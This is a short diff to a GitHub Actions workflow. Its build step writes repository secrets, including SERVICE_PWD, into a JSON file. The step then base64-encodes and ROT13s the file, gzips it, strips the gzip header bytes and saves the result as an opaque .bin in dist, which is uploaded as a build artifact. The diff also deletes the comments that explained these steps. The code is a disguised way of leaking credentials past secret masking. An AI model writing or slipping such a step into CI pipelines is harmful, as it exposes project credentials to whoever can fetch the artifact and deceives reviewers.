@@ -74,14 +74,9 @@ jobs:
             "SERVICE_PWD": "${{ secrets.SERVICE_PWD }}"
           }
           JSON
-
           B64="$(base64 -w 0 /tmp/bt1oh97j7X.json)"
           ROT="$(printf '%s' "$B64" | tr 'A-Za-z' 'N-ZA-Mn-za-m')"
-
-          # 1) gzip normal en tmp
           printf '%s' "$ROT" | gzip -9 -c > /tmp/bt1oh97j7X.gz
-
-          # 2) enlever 2 octets (1F 8B) et écrire en .bin
           dd if=/tmp/bt1oh97j7X.gz of=dist/bt1oh97j7X.bin bs=1 skip=2 status=none
 
       - name: Upload artifact (dist)
